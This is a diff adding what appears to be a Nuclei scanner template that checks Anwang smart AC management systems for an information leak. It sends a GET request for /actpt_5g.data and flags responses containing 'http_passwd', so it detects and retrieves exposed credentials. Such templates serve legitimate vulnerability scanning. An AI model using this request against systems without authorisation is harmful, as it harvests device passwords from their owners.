@@ -1,0 +1,27 @@
+id: anwang-ac-info
+
+info:
+  name: anwang-ac-info
+  author: god
+  severity: low
+  description: 安网智能AC管理系统actpt_5g.data存在信息漏洞，攻击者可利用该漏洞获取敏感信息。
+  reference:
+  - https://blog.csdn.net/weixin_48539059/article/details/134689659
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /actpt_5g.data HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+  - type: word
+    words:
+    - "200"
+    - http_passwd
+    condition: and
